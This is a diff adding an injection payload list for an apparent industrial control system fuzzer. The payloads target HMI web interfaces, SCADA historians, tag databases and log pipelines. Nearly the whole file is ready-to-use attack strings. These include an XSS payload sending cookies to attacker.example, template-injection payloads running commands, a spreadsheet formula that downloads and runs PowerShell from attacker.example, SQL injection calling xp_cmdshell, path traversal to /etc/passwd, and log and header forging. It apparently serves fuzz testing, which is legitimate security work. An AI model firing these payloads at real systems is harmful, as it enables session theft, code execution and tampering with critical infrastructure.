@@ -1,0 +1,63 @@
+# Extended secondary injection payload list for icsFuzzer
+# Used via --injection-file payloads/hmi-injection.txt
+# These strings target downstream systems (HMI, historians, SCADA DBs, log pipelines)
+# that may ingest Modbus register values as strings.
+# See lab-notes/modbus-research.md §Secondary Injection for context.
+
+# --- XSS variants (HMI web interfaces, thin-client dashboards) ---
+<img src=x onerror=alert(1)>
+<svg/onload=alert(document.domain)>
+<iframe src="javascript:alert(1)">
+"><script>fetch('http://attacker.example/'+document.cookie)</script>
+<body onload=alert(1)>
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+
+# --- SSTI — Jinja2 / Twig / Freemarker (Python/PHP/Java HMIs) ---
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# --- CSV / spreadsheet injection (historian exports, audit logs) ---
+=CMD|' /C calc'!A0
+=HYPERLINK("http://attacker.example","click")
++cmd|' /C powershell IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.example\")'!A0
+-2+3+cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
+
+# --- Log injection (syslog, SIEM pipelines) ---
+foo%0abar%0a[CRITICAL]%20login%20successful%20user%3droot
+\n[ALERT] Authentication bypass\nUser=admin Password=admin
+\r\n[ERROR] null pointer exception at address 0x0
+
+# --- SQL injection (SCADA historian DBs, tag databases) ---
+'; EXEC xp_cmdshell('dir');--
+1' UNION SELECT table_name,2,3 FROM information_schema.tables--
+1; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+admin'--
+') OR ('1'='1
+
+# --- OPC-UA NodeId / browse path injection ---
+ns=1;s=../../../../etc/passwd
+ns=2;s=<script>alert(1)</script>
+ns=0;s=\x00\x00\x00\x00
+
+# --- Header / protocol field injection (REST gateways, OPC-UA bridges) ---
+Content-Type: application/json\r\nX-Injected: true
+Host: attacker.example\r\n\r\nGET / HTTP/1.1\r\nHost: internal
+../../../etc/passwd%00
+
+# --- Long strings (buffer candidates for historian tag name fields) ---
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41
+
+# --- Null / control characters ---
+test\x00value
+\x00\x00\x00\x00\x00\x00\x00\x00
+tag\x0aname
+tag\x0dname
